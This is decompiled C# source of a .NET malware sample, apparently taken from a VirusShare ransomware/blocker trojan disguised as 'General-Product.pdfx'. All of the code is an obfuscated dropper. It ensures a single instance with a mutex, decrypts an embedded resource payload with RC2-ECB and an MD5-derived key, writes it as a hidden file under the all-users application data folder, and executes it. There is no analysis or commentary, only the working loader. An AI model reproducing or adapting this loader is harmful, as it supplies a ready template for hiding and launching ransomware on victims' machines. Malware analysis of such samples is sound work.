// Decompiled with JetBrains decompiler
// Type: .
// Assembly: General-Product.pdfx, Version=2.8.22.4397, Culture=neutral, PublicKeyToken=null
// MVID: EFEC4D24-C73A-4539-8E6D-B51A1950033C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-62708cc9e48ff66131ca439be7447170969c503be1ff39d2c19f9613c32565d2.exe

using \u0010;
using \u0082\u000F;
using \u0084;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace \u0010
{
  internal sealed class \u0015\u008D\u0006
  {
    private static string \u0001 = \u0004.\u0090\u0002(149);
    private static Mutex \u0002;

    [STAThread]
    public static void \u008D\u000F()
    {
      \u0015\u008D\u0006.\u0016\u008D\u0006(\u0015\u008D\u0006.\u0001);
      \u0015\u008D\u0006.\u0017\u008D\u0006();
    }

    public static void \u0016\u008D\u0006([In] string obj0)
    {
      try
      {
        Mutex.OpenExisting(obj0);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0015\u008D\u0006.\u0002 = new Mutex(false, obj0);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0017\u008D\u0006()
    {
      ResourceManager resourceManager = new ResourceManager(\u0004.\u0090\u0002(206), Assembly.GetExecutingAssembly());
      string str = \u0084\u000F.\u008B\u000F().FileSystem.SpecialDirectories.AllUsersApplicationData + Encoding.UTF8.GetString(Convert.FromBase64String(\u0004.\u0090\u0002(215)));
      if (File.Exists(str))
        File.Delete(str);
      byte[] bytes = \u0015\u008D\u0006.\u0018\u008D\u0006(Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(\u0004.\u0090\u0002(240)))), Conversions.ToString(resourceManager.GetObject(\u0004.\u0090\u0002(257))));
      File.WriteAllBytes(str, bytes);
      File.SetAttributes(str, FileAttributes.Hidden);
      Process.Start(str);
      ProjectData.EndApp();
    }

    public static byte[] \u0018\u008D\u0006([In] byte[] obj0, [In] string obj1)
    {
      RC2CryptoServiceProvider cryptoServiceProvider = new RC2CryptoServiceProvider();
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(obj1));
      cryptoServiceProvider.Key = hash;
      cryptoServiceProvider.Mode = CipherMode.ECB;
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
      byte[] inputBuffer = obj0;
      return decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
  }
}
